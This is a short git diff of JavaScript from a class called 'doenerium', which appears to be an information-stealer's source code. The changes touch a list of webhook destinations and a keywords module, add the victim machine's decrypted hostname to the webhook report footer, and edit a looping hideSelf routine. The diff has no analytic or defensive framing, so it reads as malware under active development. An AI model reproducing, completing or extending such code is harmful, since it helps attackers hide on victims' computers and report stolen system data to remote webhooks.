@@ -131,7 +131,6 @@ class doenerium {
 
     this.config.webhook = require("./config")(this);
     this.webhooks = [this.config.webhook.url];
-    this.webhooks2 = [this.config.webhook.url2];
     this.config.keywords = require("./keywords")(this);
 
     this.utils = {
@@ -243,7 +242,9 @@ class doenerium {
       process.exit(0);
     }
     this.config.embed.footer = {
-      text: `${this.config.embed.credits}`,
+      text: `${this.utils.encryption.decryptData(
+        this.config.user.hostname
+      )} | ${this.config.embed.credits}`,
       icon_url: this.config.embed.avatar_url,
     };
 
@@ -306,7 +307,6 @@ async function hideSelf() {
 
       break;
     } catch {
-      // no internet connection
     }
 
     await new Promise((resolve) => setTimeout(resolve, 3000));
